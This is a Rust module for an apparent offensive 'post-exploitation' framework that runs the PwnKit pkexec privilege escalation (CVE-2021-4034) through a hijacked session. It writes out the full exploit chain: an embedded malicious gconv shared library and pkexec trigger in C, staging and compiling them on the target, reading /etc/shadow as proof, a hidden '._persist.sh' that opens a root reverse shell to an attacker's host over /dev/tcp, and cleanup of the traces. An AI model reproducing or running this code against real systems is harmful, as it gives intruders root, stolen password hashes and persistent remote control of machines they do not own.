///! PwnKit LPE (CVE-2021-4034) Post-Exploitation Module
///!
///! Local privilege escalation via pkexec out-of-bounds write in polkit.
///! Operates through an existing session to escalate from unprivileged user to root.
///! Uses the Session Interaction API to execute all commands remotely.

use amatsumara_api::*;
use amatsumara_api::session_api;
use std::os::raw::{c_char, c_int, c_void};
use serde::Deserialize;
use std::ffi::CStr;

static NAME: &str = "PwnKit LPE";
static DESCRIPTION: &str =
    "CVE-2021-4034: Local privilege escalation via pkexec out-of-bounds write in polkit";
static AUTHOR: &str = "Amatsumara Project";
static PLATFORMS: &[Platform] = &[Platform::Linux];
static ARCHS: &[Arch] = &[Arch::X64, Arch::X86, Arch::ARM64];

static SESSION_NAME: &str = "SESSION";
static SESSION_DESC: &str = "Session ID to run on";
static SESSION_DEFAULT: &str = "1";

static WDIR_NAME: &str = "WRITEABLE_DIR";
static WDIR_DESC: &str = "Writable directory to stage exploit files";
static WDIR_DEFAULT: &str = "/tmp";

static CLEANUP_NAME: &str = "CLEANUP";
static CLEANUP_DESC: &str = "Remove staged files after execution";
static CLEANUP_DEFAULT: &str = "true";

static PERSIST_NAME: &str = "PERSIST";
static PERSIST_DESC: &str = "Spawn a reverse shell as root after escalation";
static PERSIST_DEFAULT: &str = "false";

static LPORT_NAME: &str = "LPORT";
static LPORT_DESC: &str = "Port for the root reverse shell (used with PERSIST)";
static LPORT_DEFAULT: &str = "4445";

static OPTIONS: &[ModuleOption] = &[
    ModuleOption {
        name: CString {
            ptr: SESSION_NAME.as_ptr() as *const c_char,
            len: SESSION_NAME.len(),
        },
        description: CString {
            ptr: SESSION_DESC.as_ptr() as *const c_char,
            len: SESSION_DESC.len(),
        },
        required: true,
        option_type: OptionType::String,
        default_value: CString {
            ptr: SESSION_DEFAULT.as_ptr() as *const c_char,
            len: SESSION_DEFAULT.len(),
        },
    },
    ModuleOption {
        name: CString {
            ptr: WDIR_NAME.as_ptr() as *const c_char,
            len: WDIR_NAME.len(),
        },
        description: CString {
            ptr: WDIR_DESC.as_ptr() as *const c_char,
            len: WDIR_DESC.len(),
        },
        required: false,
        option_type: OptionType::String,
        default_value: CString {
            ptr: WDIR_DEFAULT.as_ptr() as *const c_char,
            len: WDIR_DEFAULT.len(),
        },
    },
    ModuleOption {
        name: CString {
            ptr: CLEANUP_NAME.as_ptr() as *const c_char,
            len: CLEANUP_NAME.len(),
        },
        description: CString {
            ptr: CLEANUP_DESC.as_ptr() as *const c_char,
            len: CLEANUP_DESC.len(),
        },
        required: false,
        option_type: OptionType::Bool,
        default_value: CString {
            ptr: CLEANUP_DEFAULT.as_ptr() as *const c_char,
            len: CLEANUP_DEFAULT.len(),
        },
    },
    ModuleOption {
        name: CString {
            ptr: PERSIST_NAME.as_ptr() as *const c_char,
            len: PERSIST_NAME.len(),
        },
        description: CString {
            ptr: PERSIST_DESC.as_ptr() as *const c_char,
            len: PERSIST_DESC.len(),
        },
        required: false,
        option_type: OptionType::Bool,
        default_value: CString {
            ptr: PERSIST_DEFAULT.as_ptr() as *const c_char,
            len: PERSIST_DEFAULT.len(),
        },
    },
    ModuleOption {
        name: CString {
            ptr: LPORT_NAME.as_ptr() as *const c_char,
            len: LPORT_NAME.len(),
        },
        description: CString {
            ptr: LPORT_DESC.as_ptr() as *const c_char,
            len: LPORT_DESC.len(),
        },
        required: false,
        option_type: OptionType::String,
        default_value: CString {
            ptr: LPORT_DEFAULT.as_ptr() as *const c_char,
            len: LPORT_DEFAULT.len(),
        },
    },
];

static MODULE_INFO: ModuleInfo = ModuleInfo {
    api_version: MODULE_API_VERSION,
    metadata: ModuleMetadata {
        name: CString {
            ptr: NAME.as_ptr() as *const c_char,
            len: NAME.len(),
        },
        description: CString {
            ptr: DESCRIPTION.as_ptr() as *const c_char,
            len: DESCRIPTION.len(),
        },
        author: CString {
            ptr: AUTHOR.as_ptr() as *const c_char,
            len: AUTHOR.len(),
        },
        module_type: ModuleType::Post,
        platforms: PlatformArray {
            ptr: PLATFORMS.as_ptr(),
            len: PLATFORMS.len(),
        },
        archs: ArchArray {
            ptr: ARCHS.as_ptr(),
            len: ARCHS.len(),
        },
        ranking: Ranking::Excellent,
        privileged: false,
    },
    options: OptionArray {
        ptr: OPTIONS.as_ptr(),
        len: OPTIONS.len(),
    },
};

static VTABLE: ModuleVTable = ModuleVTable {
    get_info,
    init,
    destroy,
    check: None,
    run,
};

// Auto-generates amatsumara_module_init + amatsumara_set_session_api + AtomicPtr
register_post_module!(MODULE_INFO, VTABLE);

struct ModuleInstance {
    _dummy: u8,
}

#[derive(Deserialize, Debug)]
struct PostOptions {
    #[serde(rename = "SESSION")]
    session: Option<String>,
    #[serde(rename = "WRITEABLE_DIR", default = "default_writeable_dir")]
    writeable_dir: String,
    #[serde(rename = "CLEANUP", default = "default_cleanup")]
    cleanup: String,
    #[serde(rename = "PERSIST", default = "default_persist")]
    persist: String,
    #[serde(rename = "LPORT", default = "default_lport")]
    lport: String,
    #[serde(rename = "LHOST")]
    lhost: Option<String>,
}

fn default_writeable_dir() -> String {
    "/tmp".to_string()
}

fn default_cleanup() -> String {
    "true".to_string()
}

fn default_persist() -> String {
    "false".to_string()
}

fn default_lport() -> String {
    "4445".to_string()
}

extern "C" fn get_info() -> *const ModuleInfo {
    &MODULE_INFO
}

extern "C" fn init() -> *mut c_void {
    Box::into_raw(Box::new(ModuleInstance { _dummy: 0 })) as *mut c_void
}

extern "C" fn destroy(instance: *mut c_void) {
    if !instance.is_null() {
        unsafe {
            let _ = Box::from_raw(instance as *mut ModuleInstance);
        }
    }
}

/// Session context passed to helper functions
struct SessionCtx {
    api: *const session_api::SessionApi,
    session_id: u32,
}

impl SessionCtx {
    fn exec(&self, cmd: &str) -> String {
        match unsafe { session_api::session_exec(self.api, self.session_id, cmd, 15000) } {
            Ok(output) => output,
            Err(_) => String::new(),
        }
    }

    /// Write file content to remote target via base64 encoding.
    /// This avoids shell escaping issues with embedded C source code.
    fn write_file(&self, path: &str, content: &str) -> bool {
        let encoded = base64_encode(content.as_bytes());
        let cmd = format!("echo '{}' | base64 -d > '{}' && echo WRITE_OK", encoded, path);
        let result = self.exec(&cmd);
        result.contains("WRITE_OK")
    }
}

extern "C" fn run(_instance: *mut c_void, config: *const c_char) -> c_int {
    let options: PostOptions = match parse_options(config) {
        Ok(opts) => opts,
        Err(e) => {
            eprintln!("[-] Failed to parse options: {}", e);
            return 1;
        }
    };

    let session_str = match options.session.as_deref() {
        Some(s) if !s.is_empty() => s,
        _ => {
            eprintln!("[-] SESSION option is required");
            return 1;
        }
    };

    let session_id: u32 = match session_str.parse() {
        Ok(id) => id,
        Err(_) => {
            eprintln!("[-] Invalid SESSION value: {}", session_str);
            return 1;
        }
    };

    let api = get_session_api();
    if api.is_null() {
        eprintln!("[-] Session API not available. Framework does not support session interaction.");
        return 1;
    }

    if !unsafe { session_api::session_is_alive(api, session_id) } {
        eprintln!("[-] Session {} is not alive", session_id);
        return 1;
    }

    let ctx = SessionCtx { api, session_id };
    let work_dir = options.writeable_dir.trim_end_matches('/');
    let cleanup = options.cleanup.to_lowercase() == "true";
    let persist = options.persist.to_lowercase() == "true";
    let lport = options.lport.clone();
    let lhost = options.lhost.clone().unwrap_or_default();

    eprintln!("[*] PwnKit LPE (CVE-2021-4034)");
    eprintln!("[*] Polkit pkexec local privilege escalation");
    eprintln!("[*] Operating via session {}", session_id);
    eprintln!();

    // ── Step 1: Pre-flight checks ──────────────────────────────────────────────

    eprintln!("[*] Step 1: Pre-flight checks");

    let pkexec_check = ctx.exec("ls -la /usr/bin/pkexec 2>/dev/null");
    if pkexec_check.is_empty() {
        eprintln!("[-] /usr/bin/pkexec not found. Target is not vulnerable.");
        return 1;
    }
    eprintln!("[+] pkexec found: {}", pkexec_check.trim());

    if !pkexec_check.contains("rws") && !pkexec_check.contains("rwS") {
        eprintln!("[-] pkexec is not SUID. Target is not exploitable.");
        return 1;
    }
    eprintln!("[+] pkexec has SUID bit set");

    let version = ctx.exec("pkexec --version 2>/dev/null");
    if !version.is_empty() {
        eprintln!("[*] polkit version: {}", version.trim());
    } else {
        let dpkg_ver = ctx.exec("dpkg -l policykit-1 2>/dev/null | grep ^ii | awk '{print $3}'");
        if !dpkg_ver.is_empty() {
            eprintln!("[*] policykit-1 version (dpkg): {}", dpkg_ver.trim());
        } else {
            let rpm_ver = ctx.exec("rpm -qa polkit 2>/dev/null");
            if !rpm_ver.is_empty() {
                eprintln!("[*] polkit version (rpm): {}", rpm_ver.trim());
            } else {
                eprintln!("[!] Could not determine polkit version");
            }
        }
    }

    let compiler = if !ctx.exec("which gcc 2>/dev/null").is_empty() {
        "gcc"
    } else if !ctx.exec("which cc 2>/dev/null").is_empty() {
        "cc"
    } else {
        eprintln!("[!] No compiler found - attempting pre-compiled binary fallback.");
        eprintln!("[-] Cannot proceed without gcc or cc on target.");
        return 1;
    };
    eprintln!("[+] Compiler found: {}", compiler);

    let touch_test = format!("{}/pwnkit_write_test", work_dir);
    let write_check = ctx.exec(&format!(
        "touch '{}' 2>/dev/null && rm -f '{}' && echo ok",
        touch_test, touch_test
    ));
    if !write_check.contains("ok") {
        eprintln!("[-] {} is not writable", work_dir);
        return 1;
    }
    eprintln!("[+] Write access confirmed: {}", work_dir);
    eprintln!();

    // ── Step 2: Stage exploit files ────────────────────────────────────────────

    eprintln!("[*] Step 2: Staging exploit files to {}", work_dir);

    let evil_so_path = format!("{}/evil-so.c", work_dir);
    let exploit_path = format!("{}/exploit.c", work_dir);
    let gconv_trigger_dir = format!("{}/GCONV_PATH=.", work_dir);
    let pwnkit_dir = format!("{}/pwnkit", work_dir);

    if !ctx.write_file(&evil_so_path, EVIL_SO_C) {
        eprintln!("[-] Failed to write evil-so.c");
        do_cleanup(&ctx, work_dir, cleanup);
        return 1;
    }
    eprintln!("[+] Staged evil-so.c");

    if !ctx.write_file(&exploit_path, EXPLOIT_C) {
        eprintln!("[-] Failed to write exploit.c");
        do_cleanup(&ctx, work_dir, cleanup);
        return 1;
    }
    eprintln!("[+] Staged exploit.c");

    ctx.exec(&format!("mkdir -p '{}'", gconv_trigger_dir));
    ctx.exec(&format!(
        "touch '{}/pwnkit' && chmod +x '{}/pwnkit'",
        gconv_trigger_dir, gconv_trigger_dir
    ));
    eprintln!("[+] Created GCONV_PATH=. trigger directory");

    ctx.exec(&format!("mkdir -p '{}'", pwnkit_dir));

    let gconv_modules_content = "module UTF-8// PWNKIT// pwnkit 2\n";
    let gconv_modules_path = format!("{}/gconv-modules", pwnkit_dir);
    if !ctx.write_file(&gconv_modules_path, gconv_modules_content) {
        eprintln!("[-] Failed to write gconv-modules config");
        do_cleanup(&ctx, work_dir, cleanup);
        return 1;
    }
    eprintln!("[+] Staged gconv-modules config in pwnkit/");
    eprintln!();

    // ── Step 3: Compile ────────────────────────────────────────────────────────

    eprintln!("[*] Step 3: Compiling exploit");

    let so_compile = ctx.exec(&format!(
        "cd '{}' && {} -shared -o pwnkit/pwnkit.so -fPIC evil-so.c 2>&1",
        work_dir, compiler
    ));
    if !so_compile.is_empty() && so_compile.contains("error") {
        let fallback = if compiler == "gcc" { "cc" } else { "gcc" };
        let retry = ctx.exec(&format!(
            "cd '{}' && {} -shared -o pwnkit/pwnkit.so -fPIC evil-so.c 2>&1",
            work_dir, fallback
        ));
        if !retry.is_empty() && retry.contains("error") {
            eprintln!("[-] Compilation failed. Target may not have gcc/cc installed.");
            eprintln!("[-] Compiler output: {}", retry.trim());
            do_cleanup(&ctx, work_dir, cleanup);
            return 1;
        }
    }
    eprintln!("[+] Compiled evil shared library (pwnkit/pwnkit.so)");

    let exploit_compile = ctx.exec(&format!(
        "cd '{}' && {} exploit.c -o pwnkit_exploit 2>&1",
        work_dir, compiler
    ));
    if !exploit_compile.is_empty() && exploit_compile.contains("error") {
        let fallback = if compiler == "gcc" { "cc" } else { "gcc" };
        let retry = ctx.exec(&format!(
            "cd '{}' && {} exploit.c -o pwnkit_exploit 2>&1",
            work_dir, fallback
        ));
        if !retry.is_empty() && retry.contains("error") {
            eprintln!("[-] Compilation failed. Target may not have gcc/cc installed.");
            eprintln!("[-] Compiler output: {}", retry.trim());
            do_cleanup(&ctx, work_dir, cleanup);
            return 1;
        }
    }
    eprintln!("[+] Compiled exploit binary (pwnkit_exploit)");
    eprintln!();

    // ── Step 4: Execute ────────────────────────────────────────────────────────

    eprintln!("[*] Step 4: Executing exploit");
    eprintln!("[!] Note: This exploit may leave traces in system logs. This is expected behavior from the Qualys-documented exploitation path.");
    eprintln!();

    // When PERSIST is enabled, write a reverse shell script to disk and invoke
    // it in the same pwnkit_exploit pipe. gconv_init() self-cleans GCONV_PATH=.
    // and pwnkit/ before spawning the root shell, so a second pwnkit_exploit
    // run would fail. Writing to a script avoids shell quoting issues entirely.
    if persist {
        if lhost.is_empty() {
            eprintln!("[-] PERSIST requires LHOST to be set");
            do_cleanup(&ctx, work_dir, cleanup);
            return 1;
        }
        let persist_script = format!("{}/._persist.sh", work_dir);
        let script_content = format!(
            "#!/bin/bash\nbash -i >& /dev/tcp/{}/{} 0>&1 &\n",
            lhost, lport
        );
        if !ctx.write_file(&persist_script, &script_content) {
            eprintln!("[-] Failed to write persist script");
            do_cleanup(&ctx, work_dir, cleanup);
            return 1;
        }
        ctx.exec(&format!("chmod +x '{}'", persist_script));
    }

    let exec_cmd = if persist {
        format!("id && whoami && echo PWNKIT_SUCCESS && bash {}/._persist.sh", work_dir)
    } else {
        "id && whoami && echo PWNKIT_SUCCESS".to_string()
    };

    let exec_result = ctx.exec(&format!(
        "cd '{}' && echo '{}' | ./pwnkit_exploit 2>/dev/null",
        work_dir, exec_cmd
    ));

    if exec_result.contains("uid=0") {
        eprintln!("[+] Privilege escalation successful! Root shell obtained.");
        eprintln!("[+] {}", exec_result.lines().next().unwrap_or("uid=0(root)"));

        if exec_result.contains("PWNKIT_SUCCESS") {
            eprintln!("[+] Root access confirmed via PwnKit (CVE-2021-4034)");
        }

        eprintln!("[+] Current session now has root privileges.");
        eprintln!();

        if persist {
            eprintln!("[+] Root reverse shell dispatched - catch it with multi_handler on LPORT {}", lport);
        } else {
            let root_check = ctx.exec(&format!(
                "cd '{}' && echo 'cat /etc/shadow | head -3' | ./pwnkit_exploit 2>/dev/null",
                work_dir
            ));
            if !root_check.is_empty() {
                eprintln!("[+] Shadow file accessible (root verification):");
                for line in root_check.lines().take(3) {
                    if !line.is_empty() {
                        eprintln!("    {}", line);
                    }
                }
            }
        }
    } else {
        eprintln!("[-] Exploit did not produce root. Target may be patched.");
        if !exec_result.is_empty() {
            eprintln!("[-] Output: {}", exec_result.trim());
        }
        do_cleanup(&ctx, work_dir, cleanup);
        return 1;
    }
    eprintln!();

    // ── Step 5: Cleanup ────────────────────────────────────────────────────────

    do_cleanup(&ctx, work_dir, cleanup);

    0
}

fn do_cleanup(ctx: &SessionCtx, work_dir: &str, cleanup: bool) {
    if cleanup {
        eprintln!("[*] Step 5: Cleaning up staged files");
        ctx.exec(&format!(
            "cd '{}' && rm -rf 'GCONV_PATH=.' pwnkit pwnkit_exploit evil-so.c exploit.c ._persist.sh 2>/dev/null",
            work_dir
        ));
        eprintln!("[*] Cleanup complete.");
    } else {
        eprintln!("[*] Cleanup disabled - exploit files remain in {}", work_dir);
    }
}

/// Minimal base64 encoder - avoids pulling in a crate dependency for this one use.
fn base64_encode(input: &[u8]) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity((input.len() + 2) / 3 * 4);
    for chunk in input.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let triple = (b0 << 16) | (b1 << 8) | b2;
        out.push(CHARS[((triple >> 18) & 0x3F) as usize] as char);
        out.push(CHARS[((triple >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 {
            out.push(CHARS[((triple >> 6) & 0x3F) as usize] as char);
        } else {
            out.push('=');
        }
        if chunk.len() > 2 {
            out.push(CHARS[(triple & 0x3F) as usize] as char);
        } else {
            out.push('=');
        }
    }
    out
}

fn parse_options(config: *const c_char) -> Result<PostOptions, Box<dyn std::error::Error>> {
    if config.is_null() {
        return Ok(PostOptions {
            session: None,
            writeable_dir: default_writeable_dir(),
            cleanup: default_cleanup(),
            persist: default_persist(),
            lport: default_lport(),
            lhost: None,
        });
    }
    Ok(serde_json::from_str(unsafe {
        CStr::from_ptr(config).to_str()?
    })?)
}

// ── Embedded C source files ────────────────────────────────────────────────────

static EVIL_SO_C: &str = r#"#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}

void gconv_init() {
    setuid(0); setgid(0);
    seteuid(0); setegid(0);
    system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh");
    exit(0);
}
"#;

static EXPLOIT_C: &str = r#"#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    char *envp[] = {
        "pwnkit",
        "PATH=GCONV_PATH=.",
        "CHARSET=PWNKIT",
        "SHELL=pwnkit",
        NULL
    };

    execve("/usr/bin/pkexec", (char*[]){NULL}, envp);
    perror("execve");
    return 1;
}
"#;
